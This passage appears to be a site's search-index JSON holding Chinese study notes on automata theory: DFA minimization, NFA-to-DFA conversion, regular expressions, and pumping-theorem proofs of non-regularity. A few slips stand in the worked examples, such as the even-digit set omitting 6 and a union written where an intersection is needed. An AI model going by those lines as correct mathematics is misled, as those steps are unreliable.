\\(\\to\\) \\(q_5\\) (\u5728\u63a5\u53d7\u7ec4)</li> <li>\\(q_4\\) \u8f93\u5165 1 \\(\\to\\) \\(q_5\\) (\u5728\u63a5\u53d7\u7ec4)</li> </ul> <p>\\(q_0, q_1\\) \u5728\u8f93\u5165 1 \u540e\u4ecd\u7136\u7559\u5728\u975e\u63a5\u53d7\u7ec4\uff0c\u800c \\(q_2, q_3, q_4\\) \u5728\u8f93\u5165 1 \u540e\u8df3\u5230\u4e86\u63a5\u53d7\u7ec4 (\\(q_5\\))\u3002\u56e0\u6b64\uff0c\\(\\{q_0, q_1\\}\\) \u548c \\(\\{q_2, q_3, q_4\\}\\) \u5fc5\u987b\u5206\u5f00\u3002\u73b0\u5728\u7684\u5212\u5206\u53d8\u6210\u4e86\u4e09\u7ec4\uff1a\\(P_1 = \\{ \\{q_0, q_1\\}, \\{q_2, q_3, q_4\\}, \\{q_5\\} \\}\\)</p> <p>\u540e\u7eed\u7ec6\u5206\u6b65\u9aa4\u4ee5\u6b64\u7c7b\u63a8</p>"},{"location":"Courses/tcs/Topic2/#nondeterministic-finite-automata","title":"Nondeterministic Finite Automata","text":"<p>NFA \u4e0d\u540c\u4e8e DFA\uff0c\u5b83\u5728\u67d0\u4e9b\u72b6\u6001\u4e0b\u8bfb\u5230\u4e00\u4e2a\u7b26\u53f7\u65f6\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u53bb\u5411\uff0c\u751a\u81f3\u53ef\u4ee5\u4e0d\u8bfb\u5165\u8f93\u5165\u5c31\u8df3\u8f6c\u3002\u8fd9\u79cd\u4e0d\u786e\u5b9a\u6027\u8ba9\u5b83\u540c\u65f6\u5c1d\u8bd5\u591a\u6761\u8def\u5f84\uff0c\u53ea\u8981\u6709\u4e00\u6761\u6210\u529f\u5c31\u63a5\u53d7\u8f93\u5165\u3002</p> <p>NFA \u540c\u6837\u662f\u7531\u4e94\u4e2a\u53c2\u6570\u7ec4\u6210\uff0c\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u7684\u8f6c\u6362\u65b9\u5f0f\u7531 function \u53d8\u4e3a\u4e86 relation\uff1a</p> <ul> <li>\\(K\\): finite set of states</li> <li>\\(\\Sigma\\): alphabet</li> <li>\\(s\\in K\\): initial state</li> <li>\\(F\\subseteq K\\): set of final states</li> <li>\\(\\Delta\\): transition relation<ul> <li>\\(\\Delta \\subseteq K\\times (\\Sigma \\cup \\{e\\}) \\times K\\)</li> </ul> </li> </ul> \u5e94\u7528 NFA \u7684\u4e09\u4e2a\u4f8b\u5b50 <p></p> <p>\u4e24\u4e2a\u81ea\u52a8\u673a \\(M_1\\),\\(M_2\\) \u76f8\u7b49\uff0c\u5f53\u4e14\u4ec5\u5f53 \\(L(M_1)=L (M_2)\\)\u3002\u6211\u4eec\u5e0c\u671b\u8bc1\u660e DFAs \u548c NFAs \u5728\u80fd\u529b\u4e0a\u7b49\u4ef7\u65f6\uff0c\u5fc5\u987b\u8bc1\u660e\u4ee5\u4e0b\u4e24\u4ef6\u4e8b\uff1a</p> <ul> <li>For each DFA, produce an NFA that accepts the same language</li> <li>For each NFA, produce an DFA that accepts the same language</li> </ul> <p>\u5176\u4e2d\u7b2c\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u5bf9\u4e8e\u7b2c\u4e8c\u70b9\u8981\u6c42\uff0c\u7ed9\u5b9a\u4e00\u4e2a NFA\uff0c\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u7b49\u4ef7 DFA\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u201c\u586b\u8865\u201d DFA \u548c NFA \u4e4b\u95f4\u7684\u5dee\u5f02\u3002</p> <ul> <li>Difference 1: Transition Relation<ul> <li>Transition relation of DFA \u4e00\u5b9a\u662f\u4e00\u4e2a function: \\(K\\times \\Sigma \\times K\\)</li> <li>Transition relation of NFA \u4e0d\u4e00\u5b9a\u662f function: \\(K\\times (\\Sigma \\cup \\{e\\}) \\times K\\)</li> </ul> </li> <li>Difference 2: Domain<ul> <li>The domain of transition relation of DFA is \\(K\\times \\Sigma\\)</li> <li>The domain of transition relation of NFA is \\(K\\times (\\Sigma \\cup \\{e\\})\\)<ul> <li>\u5373 NFA \u5bb9\u5fcd\u65e0\u5b57\u7b26\u8f93\u5165\u4e0b\u7684\u72b6\u6001\u8f6c\u79fb</li> </ul> </li> </ul> </li> </ul> <p>\u3010Example\u3011</p> <p>\u4e0b\u9762\u6211\u4eec\u4ee5\u4e00\u4e2a NFA \u4e3a\u4f8b\uff1a</p> \\[\\begin{array}l K=\\{q0, q1,q2\\}, \\Sigma =\\{a,b\\}, s=q0,\\ F=\\{q2\\}, \\\\ \\Delta = \\{(q0, a,q1), (q1,b,q0), (q1,b,q2), (q2,a,q0)\\} \\end{array} \\] <p>\u7ed8\u5236\u6210 State Diagram \u7684\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e3a\u4e86\u89e3\u51b3\u4ee5\u4e0a\u4e24\u70b9 Difference\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u521d\u59cb\u72b6\u6001\u5f00\u59cb\u601d\u8003\uff0c\u8ba1\u7b97\u8f6c\u6362\u540e\u7684 DFA \u6709\u4ec0\u4e48\u72b6\u6001\u3002\u6211\u81ea\u5df1\u601d\u8003\u603b\u7ed3\u5f97\u5230\u7684\u8ba1\u7b97\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <p></p> <p>zq \u8001\u5e08\u7684 PPT \u4e0a\u7684\u65b9\u6cd5\u6211\u6ca1\u592a\u7406\u89e3\uff0c\u4e14\u7eff\u8272\u90e8\u5206 PPT \u4e0a\u6ca1\u6709</p> <p>\u6309\u7167\u5b9a\u4e49\uff0c\u4e00\u4e2a DFA \u8981\u6c42\u6bcf\u4e2a\u72b6\u6001\u5bf9\u4e8e\u6bcf\u4e2a\u8f93\u5165\u7b26\u53f7\u90fd\u5fc5\u987b\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u8f6c\u79fb\uff0c\u5426\u5219\u610f\u5473\u7740\u81ea\u52a8\u673a\u5728\u8fd9\u4e2a\u8f93\u5165\u4e0a\u662f\u4e0d\u786e\u5b9a\u7684\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u56de\u987e\u4e00\u4e0b Language \u4e2d\u7684\u95ed\u5305 EClose \\(E(q)\\)\uff1a</p> \\[ E(q)=\\{p\\in K: (q,e)\\; \\vdash_M^*\\; (p,e)\\} \\] <p>\u5728\u72b6\u6001\u673a\u6a21\u578b\u4e0b\uff0c\\(E(q)\\) \u5373\u8868\u793a\u72b6\u6001\u673a \\(M\\) \u4ece\u72b6\u6001 \\(q\\) \u5f00\u59cb\uff0c\u5728\u65e0\u8f93\u5165\u7684\u60c5\u51b5\u4e0b\u80fd\u8fbe\u5230\u7684\u6240\u6709\u72b6\u6001\u7684\u96c6\u5408\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u7ed3\u8bba\u662f\u4ece NFA \u8f6c\u6362\u5230 DFA\uff0c\u72b6\u6001\u7684\u4e2a\u6570\u53ef\u4ee5\u8fbe\u5230\u6307\u6570\u7ea7\u522b\u7684\u589e\u957f\uff0c\u4f8b\u5982\uff1a</p> \\[ |K| = 5\\;\\Rightarrow\\; |K'|=2^5 = 32 \\] <p>\u8fd9\u4e00\u70b9\u5728\u6211\u4eec\u4e0a\u9762\u753b\u7684\u6811\u4e2d\u4e5f\u6709\u6240\u4f53\u73b0\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\u5927\u90e8\u5206\u72b6\u6001\u90fd\u4e0e\u539f\u5148\u7684\u72b6\u6001\u673a\u65e0\u5173\uff0c\u56e0\u6b64\u6307\u6570\u7ea7\u53ea\u662f\u4e00\u4e2a\u4e0a\u9650\u3002</p> <p>\u3010More Example\u3011</p> More Example NFADFA <p></p> <p>\u8f6c\u6362\u6b65\u9aa4\u4ecd\u7136\u5982\u4e0a\uff0c\u6ce8\u610f\u6700\u540e\u7684 Dead State \u4e5f\u8981\u753b\u51fa\u6765\uff1a</p> <p></p>"},{"location":"Courses/tcs/Topic2/#regular-language","title":"Regular Language","text":"<p>\u4ee5\u4e0b\u5185\u5bb9\u5927\u90e8\u5206\u6765\u81ea \u8bed\u8a00\u3001\u81ea\u52a8\u673a\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f - \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c</p> <p>\u4e00\u4e2a Language \u88ab\u79f0\u4e3a regular\uff0c\u5f53\u4e14\u4ec5\u5f53\u5b83\u88ab\u4e00\u4e2a\u81ea\u52a8\u673a \\(M\\) \u63a5\u6536\u3002\u6211\u4eec\u6709\u5b9a\u7406\uff1a</p> <ul> <li>\u5982\u679c \\(A\\) \u548c \\(B\\) \u662f\u6b63\u5219\u8bed\u8a00\uff0c\u5219 \\(A\\cup B\\), \\(A\\circ B\\), \\(A^*\\) \u90fd\u662f\u6b63\u5219\u8bed\u8a00\u3002</li> </ul> <p>\u6211\u4eec\u4e00\u822c\u4f7f\u7528 \\(R\\) \u8868\u793a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4f7f\u7528 \\(L(R)\\) \u8868\u793a\u8be5\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u5e94\u7684\u8bed\u8a00\u3002\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u7531\u5982\u4e0b\u89c4\u5219\u5b9a\u4e49\uff1a</p> <ul> <li>Atomic\uff1a\u5bf9\u4e8e\u00a0\\(\\emptyset\\)\u00a0\u5bf9\u5e94\u8bed\u8a00\u00a0\\(L(\\emptyset)=\\emptyset\\)\uff0c\u5bf9\u4e8e\u00a0\\(a\\in \\Sigma\\) \u6709\u00a0\\(L(a)=\\{a\\}\\)</li> <li>Composite\uff1a<ul> <li>\\(R_1\u200b \\cup R_2\\)\u200b\u00a0\u5bf9\u5e94\u8bed\u8a00\u00a0\\(L(R_1 \\cup R_2\u200b)= L(R_1\u200b) \\cup L(R_2\u200b)\\)</li> <li>\\(R_1 R_2\\)\u200b\u00a0\u5bf9\u5e94\u8bed\u8a00\u00a0\\(L(R_1 \u200bR_2\u200b)= L(R_1\u200b)\\circ L(R_2\u200b)\\)</li> <li>\\(R_1^\u2217\\)\u200b\u00a0\u5bf9\u5e94\u8bed\u8a00\u00a0\\(L(R_1^\u2217\u200b)= L(R_1\u200b)^\u2217\\)</li> <li>\u4f18\u5148\u7ea7\uff1a\\(^*\\gt \\circ\\gt\\cup\\)<ul> <li>Ex.\u00a0\\(ab^\u2217 \\cup b^\u2217a= (a(b^\u2217)) \\cup ((b^\u2217)a)\\)</li> </ul> </li> </ul> </li> </ul> <p>\\(R\\) \u548c \\(L(R)\\) \u7684\u5bf9\u5e94\u5173\u7cfb</p> <ul> <li>\\(\\emptyset ^*\\) =&gt; \\(\\{e\\}\\)</li> <li>\\(a(a\\cup b)^* b\\) =&gt; \\(\\{w\\in \\{a,b\\}^*\\; :\\; w \\text{ starts with } a \\text{ and ends with } b\\}\\)</li> <li>\\((a\\cup b)^* a (a\\cup b)^* a (a \\cup b)^*\\) =&gt; \\(\\{w\\in \\{a,b\\}^*\\; : \\; w \\text{ contains at least two a's}\\}\\)</li> </ul> <p>\u4e8b\u5b9e\u4e0a\uff0c\u81ea\u52a8\u673a\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\u4e4b\u95f4\u662f\u7b49\u4ef7\u7684\uff0c\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\u3002\u8981\u5c06\u4e00\u4e2a FA \u8f6c\u6362\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u638c\u63e1\u5982\u4f55\u901a\u8fc7\u5f52\u7eb3\u6765\u6298\u53e0\u4e00\u4e2a\u72b6\u6001\uff0c\u5982\u4e0b\u662f\u6211\u4eec\u6240\u4f7f\u7528\u7684\u57fa\u672c\u64cd\u4f5c\uff1a</p> <p></p> <p>\u7ed9\u5b9a\u4e00\u4e2a NFA \\(M\\)\uff0c\u8981\u5316\u7b80\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f \\(R\\)\uff0c\u6211\u4eec\u8003\u8651\u4e3a\u5176\u624b\u52a8\u65b0\u589e\u4e00\u4e2a\u521d\u59cb\u72b6\u6001\u548c\u63a5\u53d7\u72b6\u6001\uff0c\u7528 e-transition \u8fde\u63a5\u5230\u539f\u6765\u7684\u521d\u59cb\u72b6\u6001\u548c\u63a5\u53d7\u72b6\u6001\uff0c\u518d\u9010\u4e00\u5220\u9664\u4e2d\u95f4\u72b6\u6001\uff1a</p> <p></p> <p>\u3010Example\u3011 \u5047\u5b9a\u6709\u81ea\u52a8\u673a \\(M\\) \u5982\u4e0b\uff1a</p> <p></p> <p>\u6309\u7167\u4e0a\u9762\u7684\u903b\u8f91\uff0c\u8f6c\u6362\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <p></p> <p>\u90a3\u4e48\u6700\u7ec8 \\(R=a^* b \\left( a\\cup b a^* b a^* b \\right)^*\\)</p> <p>\u3010More Example\u3011</p> <p>\u5df2\u77e5 \\(\\Sigma=\\{0,1,...,9\\}\\)\uff0c\u8bc1\u660e \\(L=\\{w: w\\in \\Sigma^*\\text{ be the nonnegative integers divisible by 2 and 3}\\}\\) \u662f\u6b63\u5219\u8bed\u8a00\u3002</p> <p>\u6b63\u5219\u8bed\u8a00\u4e4b\u95f4\u6709\u4e09\u79cd\u8fd0\u7b97\uff0c\u4e24\u4e2a\u6b63\u5219\u8bed\u8a00\u901a\u8fc7\u8fd9\u4e09\u79cd\u8fd0\u7b97\u7684\u7ed3\u679c\u4ecd\u7136\u662f\u6b63\u5219\u8bed\u8a00\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5c06 \\(L\\) \u5206\u89e3\u4e3a\u53ef\u4ee5\u88ab 2 \u6574\u9664\u7684 \\(L_2\\) \u4ee5\u53ca\u53ef\u4ee5\u88ab 3 \u6574\u9664\u7684 \\(L_3\\) \u5206\u522b\u8bc1\u660e\u662f\u6b63\u5219\u8bed\u8a00\u3002</p> <p>\u9996\u5148\u5bf9\u4e8e \\(L_2\\)\uff0c\u5b83\u7684\u7279\u5f81\u662f\u4e2a\u4f4d\u4e3a\u5076\u6570\uff0c\u56e0\u6b64\u8868\u793a\u5982\u4e0b\uff0c\u5b83\u4e5f\u662f\u901a\u8fc7\u51e0\u4e2a\u6b63\u5219\u8bed\u8a00\u8fd0\u7b97\u5f97\u5230\u7684\u8868\u8fbe\u5f0f\uff1a</p> \\[ L_2=\\Sigma^* \\cap \\Sigma^* \\{0,2,4,8\\} \\] <p>\u5bf9\u4e8e \\(L_3\\)\uff0c\u6211\u4eec\u77e5\u9053\u5b83\u7684\u6240\u6709\u4f4d\u6570\u5b57\u52a0\u8d77\u6765\u8981\u662f 3 \u7684\u500d\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u5b83\u7ed8\u5236\u4e00\u4e2a NFA\uff1a</p> <p></p> <p>\u56e0\u6b64 \\(L_2\\) \u548c \\(L_3\\) \u90fd\u662f\u6b63\u5219\u7684\uff0c\u800c \\(L=L_2 \\cap L_3\\) \u81ea\u7136\u4e5f\u662f\u6b63\u5219\u7684\u3002</p> <p>\u66f4\u591a\u5224\u65ad Language \u662f\u5426\u662f\u6b63\u5219\u7684\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <ul> <li>\\(L=a^*\\) \u662f\u6b63\u5219\u7684\uff0c\u56e0\u4e3a\u5b83\u88ab Regular Expression \u5b9a\u4e49</li> <li>\\(L=\\{a^n : n\\ge 0\\}\\) \u662f\u6b63\u5219\u7684\uff0c\u56e0\u4e3a\u5b83\u548c\u4e0a\u9762\u8bed\u8a00\u7b49\u4ef7</li> <li>\\(L=\\{w^R: w\\in L_0, \\text{ and}\\ L_0\\text{ is regular}\\}\\) \u662f\u6b63\u5219\u7684<ul> <li>\u8fd9\u91cc \\(^R\\) \u8868\u793a\u53cd\u8f6c</li> </ul> </li> <li>\\(L=\\{a^n: n\\in Even\\}\\) \u662f\u6b63\u5219\u7684\uff0c\u56e0\u4e3a\u5b83\u7b49\u4ef7\u4e8e \\(L=(aa)^*\\)</li> <li>\\(L=\\{w\\in \\{a,b\\}^*: w\\text{ has an equal number of a's and b's}\\}\\) \u4e0d\u662f\u6b63\u5219\u7684<ul> <li>\u5047\u8bbe \\(L\\) \u662f\u6b63\u5219\u7684\uff0c\u90a3\u4e48 \\(L\\cap a^* b^*=\\{ a^n b^n: n \\ge 0\\}\\) \u5c31\u662f\u6b63\u5219\u7684\uff0c\u4f46\u662f FA \u65e0\u6cd5\u8bb0\u5fc6\u524d\u9762\u6709\u591a\u5c11\u4e2a a \u4ee5\u786e\u4fdd\u540e\u9762\u51fa\u73b0\u76f8\u540c\u6570\u91cf\u7684 b\uff0c\u56e0\u6b64\u77db\u76fe</li> </ul> </li> <li>\\(L=\\{a^n: n\\in Prime\\}\\) \u4e0d\u662f\u6b63\u5219\u7684<ul> <li>\u6ce8\u610f\u8fd9\u662f\u8d28\u6570\uff0c\u4e0d\u662f\u5947\u6570</li> </ul> </li> <li>\\(L=\\{ww^R : w\\in \\{a,b\\}^*\\}\\) \u4e0d\u662f\u6b63\u5219\u7684</li> <li>\\(L=\\{ww: w\\in \\{a,b\\}^*\\}\\) \u4e0d\u662f\u6b63\u5219\u7684</li> <li>\\(L=\\{wcw: w\\in \\{a,b\\}^*\\}\\) \u4e0d\u662f\u6b63\u5219\u7684</li> </ul> <p>\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2a\u975e\u7a7a alphabet \\(\\Sigma\\)\uff0c\u5b83\u7684 String \\(\\Sigma^*\\) \u662f\u53ef\u6570\u65e0\u9650\u96c6\uff08Countable Infinite\uff09\uff0c\u800c\u6240\u6709 Language \u5c31\u662f \\(\\Sigma^*\\) \u7684\u6240\u6709\u5b50\u96c6\uff0c\u5176\u603b\u6570\u6ee1\u8db3\uff1a</p> \\[ |P(\\Sigma^*)| \\;= \\; 2^{|\\Sigma^*|} \\] <p>\u8fd9\u610f\u5473\u7740 Language \u7684\u603b\u6570\u662f\u4e0d\u53ef\u6570\u7684\u3002</p> <p>\u4f46\u662f Regular Language \u662f\u53ef\u6570\u7684\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u6b63\u5219\u8bed\u8a00\u90fd\u53ef\u4ee5\u88ab\u4e00\u4e2a\u6709\u9650\u81ea\u52a8\u673a\u63cf\u8ff0\uff0c\u800c\u6709\u9650\u81ea\u52a8\u673a\u7684\u96c6\u5408\u662f\u53ef\u6570\u7684\u3002</p>"},{"location":"Courses/tcs/Topic2/#pumping-theorem","title":"Pumping Theorem","text":"<p>\u82e5\u00a0\\(L\\)\u00a0\u662f\u4e00\u4e2a regular language\uff0c\u5219\u5b58\u5728\u4e00\u4e2a\u5e38\u6570 pump length\u00a0\\(p\\in \\mathbb{Z}^*\\)\u00a0\u4f7f\u5f97\u00a0\\(\\forall w\\in L\\)\u00a0with\u00a0\\(|w|\\ge p\\)\u00a0\u53ef\u88ab\u5206\u4e3a 3 \u4e2a\u90e8\u5206 \\(w=xyz\\)\uff0c\u6ee1\u8db3\uff1a</p> <ul> <li>\\(\\forall i \\ge 0, xy^iz\\in L\\)</li> <li>\\(|y| &gt; 0\\)<ul> <li>\u88ab pump \u7684\u5b57\u6bb5\u975e\u7a7a</li> </ul> </li> <li>\\(|xy| \\le p\\)<ul> <li>\\(y\\) \u51fa\u73b0\u5728 String \u7684\u524d \\(p\\) \u4e2a\u5b57\u7b26\u5185</li> </ul> </li> </ul> <p>\u76f4\u89c2\u4e0a\u770b\uff0c\u5728 DFA \u63a5\u53d7\u4e00\u4e2a\u957f\u5ea6\u81f3\u5c11\u4e3a \\(p\\) \u7684\u5b57\u7b26\u4e32\u65f6\uff0c\u5f00\u59cb\u8bfb\u5165\u524d \\(p\\) \u4e2a\u5b57\u7b26\u5fc5\u7136\u7ecf\u8fc7\u67d0\u4e00\u4e2a\u72b6\u6001\u4e24\u6b21\uff08\u9e3d\u5de2\u539f\u7406\uff09\uff0c\u4e8e\u662f\u5728\u8fd9\u4e24\u4e2a\u76f8\u540c\u72b6\u6001\u4e4b\u95f4\u7684\u8bfb\u5165\u7247\u6bb5 \\(y\\) \u5c31\u662f\u4e00\u4e2a\u5faa\u73af\uff08loop\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u91cd\u590d\uff08\u6216\u5220\u53bb\u4e00\u6b21\uff0c\u76f8\u5f53\u4e8e \\(i=0\\)\uff09\uff0c\u800c\u8be5\u7247\u6bb5\u4ecd\u4fdd\u6301\u88ab DFA \u63a5\u53d7\u2014\u2014\u8fd9\u5c31\u662f\u201c\u6cf5\u201d\u7684\u542b\u4e49\u3002</p> <p>\u901a\u5e38\u6211\u4eec\u53d6 \\(p\\) \u4e3a\u67d0\u4e2a DFA \u7684\u72b6\u6001\u6570</p> <p>\u6cf5\u5b9a\u7406\u662f\u00a0Regular Language\u00a0\u7684\u4e00\u4e2a\u5fc5\u8981\u4e0d\u5145\u5206\u6761\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bc1\u660e\u6cf5\u5b9a\u7406\u4e0d\u6210\u7acb\u6765\u8bc1\u660e\u8be5\u8bed\u8a00\u4e0d\u662f\u4e00\u4e2a Regular Language\u3002</p> <ol> <li>\u5047\u8bbe \\(L\\) \u662f\u6b63\u5219\u7684</li> <li>\u90a3\u4e48\u5b58\u5728\u6cf5\u957f\u5ea6 \\(p\\)</li> <li>\u9009\u62e9\u4e00\u4e2a\u7279\u5b9a\u7684\u5b57\u7b26\u4e32 \\(w\\in L\\) \u4e14 \\(|w|\\ge p\\)\u3002\u4f60\u7684 \\(w\\) \u53ef\u4ee5\u4f9d\u8d56\u4e8e \\(p\\)\uff08\u901a\u5e38\u53d6\u4e0e \\(p\\) \u76f8\u5173\u7684\u5f62\u5f0f\uff0c\u5982 \\(a^p b^p\\)\uff09</li> <li>\u6839\u636e\u6cf5\u5f15\u7406\uff0c\u6211\u4eec\u77e5\u9053\u4efb\u610f\u5bf9\u6ee1\u8db3 \\(|xy|\\le p, |y|&gt;0\\) \u7684\u5212\u5206 \\(w=xyz\\)\uff0c\u90fd\u5e94\u5f53\u6ee1\u8db3 \\(\\forall i\\ge0,\\ xy^iz\\in L\\)</li> <li>\u5bf9\u4efb\u610f\u53ef\u80fd\u7684 \\(y\\)\uff08\u6ee1\u8db3\u4e0a\u9762\u7684\u7ea6\u675f\uff09\u6784\u9020\u4e00\u4e2a \\(i\\)\uff08\u901a\u5e38 \\(i=0\\) \u6216 \\(i=2\\)\uff09\uff0c\u4f7f\u5f97 \\(xy^iz\\notin L\\)\u3002\u8fd9\u5c31\u4e0e\u6cf5\u5f15\u7406\u7ed3\u8bba\u77db\u76fe\uff0c\u4ece\u800c \\(L\\) \u975e\u6b63\u5219\u3002</li> </ol> <p>\u6ce8\u610f\uff1a\u7b2c 5 \u6b65\u8981\u8986\u76d6\u201c\u4efb\u610f\u53ef\u80fd\u7684 \\(y\\)\u201d\u2014\u2014\u4e5f\u5c31\u662f\u8bf4\u4f60\u8981\u5206\u6790\u6240\u6709\u6ee1\u8db3 \\(|xy|\\le p, |y|&gt;0\\) \u7684\u60c5\u51b5\u5e76\u5728\u6bcf\u79cd\u60c5\u51b5\u4e0b\u7ed9\u51fa\u53cd\u4f8b\uff08\u4e00\u822c\u901a\u8fc7\u89c2\u5bdf \\(y\\) \u7684\u7ec4\u6210\uff0c\u4f8b\u5982 \\(y\\) \u53ea\u80fd\u7531\u82e5\u5e72\u4e2a <code>a</code> \u7ec4\u6210\uff0c\u4ece\u800c\u6539\u53d8 <code>a</code> \u7684\u6570\u91cf\u4f1a\u7834\u574f\u8bed\u8a00\u6027\u8d28\uff09\u3002</p> <p>\u3010Example\u3011</p> <p>\u8bc1\u660e \\(L=\\{a^n b^n \\mid n\\ge0\\}\\) \u975e\u6b63\u5219</p> <ol> <li>\u5047\u8bbe \\(L\\) \u6b63\u5219\uff0c\u8bbe\u5bf9\u5e94\u7684\u6cf5\u957f\u5ea6\u4e3a \\(p\\)\u3002</li> <li>\u53d6 \\(w = a^p b^p \\in L\\)\u3002\u663e\u7136 \\(|w| = 2p \\ge p\\)\u3002</li> <li>\u4efb\u610f\u5212\u5206 \\(w=xyz\\) \u6ee1\u8db3 \\(|xy|\\le p, |y|&gt;0\\)\u3002\u56e0\u4e3a \\(|xy|\\le p\\)\uff0c\\(xy\\) \u5b8c\u5168\u4f4d\u4e8e\u7b2c\u4e00\u4e2a \\(a^p\\) \u4e2d\uff0c\u6240\u4ee5 \\(y\\) \u53ea\u542b <code>a</code>\uff08\u4e14\u81f3\u5c11\u4e00\u4e2a <code>a</code>\uff09\u3002</li> <li>\u4ee4 \\(i=0\\)\u3002\u5219 \\(xy^0z = xz\\) \u5219\u6bd4\u539f\u6765\u5c11\u4e86\u4e00\u4e9b <code>a</code>\uff08\u800c <code>b</code> \u4e2a\u6570\u4e0d\u53d8\uff09\uff0c\u6240\u4ee5\u5f62\u72b6\u53d8\u6210 \\(a^{p-|y|} b^p\\)\uff0c\u4e0d\u5c5e\u4e8e \\(L\\)\uff08\u56e0\u4e3a <code>a</code> \u4e0e <code>b</code> \u7684\u6570\u91cf\u4e0d\u540c\uff09\u3002</li> <li>\u4e0e\u6cf5\u5f15\u7406\u7ed3\u8bba\u77db\u76fe\uff0c\u6545 \\(L\\) \u975e\u6b63\u5219\u3002</li> </ol> <p>Example</p> <p>\u5e38\u89c1\u7684 non-regular languages \u548c\u7b80\u8981\u8bc1\u660e\u601d\u8def (\\(p\\) \u662f pump length):</p> <ul> <li>\\(L = \\{0^n1^n\\}\\): \u9009 \\(0^p1^p\\)\uff0c\u5219 \\(xy^0z \\notin L\\) </li> <li>\\(L = \\{ww\\}\\), \\(L = \\{ww^R\\}\\): \u9009 \\(ab^pab^p\\) \u548c \\(b^paab^p\\)\uff0c\u5219 \\(xy^0z \\notin L\\) </li> <li>\\(L = \\{0^m1^n\\}\\) where \\(m &gt; n\\): \u9009 \\(0^{p+1}1^p\\)\uff0c\u5219 \\(xy^0z \\notin L\\) (\\(m\\ge n\\) \u4e5f\u4e00\u6837)</li> <li>\\(L = \\{0^m1^n\\}\\) where \\(m &lt; n\\): \u9009 \\(0^p1^{p+1}\\)\uff0c\u5219 \\(xyyz \\notin L\\) (\\(m\\le n\\) \u4e5f\u4e00\u6837)<ul> <li>\u6839\u636e\u4e0a\u9762\u4e24\u4e2a\u4f8b\u5b50\u53ef\u4ee5\u770b\u51fa\uff0cunion of 2 non-regular languages \u4e0d\u4e00\u5b9a\u662f non-regular \u7684\uff0c\u4f8b\u5982 \\(m &gt; n\\) \u548c \\(m \\le n\\) \u7684 union \u662f \\(0^*1^*\\)</li> </ul> </li> <li>\\(L = \\{0^m1^n\\}\\) where \\(m \\neq n\\): \u5047\u8bbe regular\uff0c\u5219 \\((\\{0^*1^*\\} - L) \\cap \\{0^*1^*\\} = \\{0^n1^n\\}\\) is regular\uff0c\u77db\u76fe</li> <li>\\(L = \\{1^n\\}\\) where \\(n\\) is prime: \u9009 \\(1^k\\) where \\(k &gt; p\\) and \\(k\\) is prime\uff0c\u82e5 \\(y = 1^s\\) where \\(0 &lt; s \\le p\\)\uff0c\u5219 \\(\\forall n \\ge 0, k + (n - 1)s\\) is prime\u3002\u4f46\u53d6 \\(n = k + 1\\) \u5f97\u5230 \\(k + ks = k(1 + s)\\) is not prime\uff0c\u77db\u76fe</li> <li>\\(L \\in \\{0, 1\\}^*\\) where numbers of 0's and 1's are equal: \u5047\u8bbe regular\uff0c\u5219 \\(L \\cup 0^*1^* = \\{0^n1^n\\}\\) is regular\uff0c\u77db\u76fe</li> </ul> <p>\u4e0d\u5b58\u5728\u5224\u65ad\u4efb\u610f\u8bed\u8a00\u662f\u5426\u4e3a Regular \u7684\u7b97\u6cd5</p> <ul> <li>\u8bc1\u660e\u8bed\u8a00\u6b63\u5219<ul> <li>\u8be5\u8bed\u8a00\u6709\u9650</li> <li>\u6784\u9020\u4e00\u4e2a\u63a5\u53d7\u8be5\u8bed\u8a00\u7684\u00a0FA</li> <li>\u6784\u9020\u4e00\u4e2a\u751f\u6210\u8be5\u8bed\u8a00\u7684\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u6b63\u5219\u8bed\u8a00\u7684\u95ed\u5305\u6027\u8d28</li> </ul> </li> <li>\u8bc1\u660e\u8bed\u8a00\u975e\u6b63\u5219<ul> <li>Pumping Theorem</li> <li>\u53cd\u8bc1<ul> <li>\u4e0d\u5b58\u5728\u63a5\u53d7\u8be5\u8bed\u8a00\u7684\u00a0FA</li> <li>\u6b63\u5219\u8bed\u8a00\u7684\u95ed\u5305\u6027\u8d28</li> </ul> </li> </ul> </li> </ul>"},{"location":"Courses/tcs/Topic2/#context-free-languages-pushdown-automata","title":"Context-free Languages &amp; Pushdown Automata","text":""},{"location":"Courses/tcs/Topic2/#context-free-language","title":"Context-free Language","text":"<p>\u5728\u5f62\u5f0f\u5316\u5b9a\u4e49\u4e0a\uff0c\u4e00\u4e2a Context-Free Grammar, CFG \u7531\u56db\u4e2a\u90e8\u5206\u7ec4\u6210 \\(G=(V, \\Sigma, R, S)\\)\uff1a</p> <ul> <li>\\(V\\)\uff1a\u5b57\u6bcd\u8868</li> <li>\\(\\Sigma \\subseteq V\\): 